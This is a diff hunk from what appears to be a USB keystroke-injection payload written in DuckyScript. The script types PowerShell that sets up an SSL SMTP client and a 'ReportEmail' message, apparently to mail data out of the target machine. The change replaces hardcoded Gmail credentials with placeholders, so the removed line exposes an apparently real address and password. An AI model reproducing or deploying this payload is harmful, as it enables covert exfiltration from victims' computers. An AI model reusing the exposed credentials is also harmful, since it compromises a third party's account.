@@ -46,7 +46,7 @@ STRING $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 ENTER
 STRING $SMTPClient.EnableSSL = $true
 ENTER
-STRING $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("totechwithit@gmail.com", "Blogtime")
+STRING $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("your email", "password")
 ENTER
 STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
 ENTER
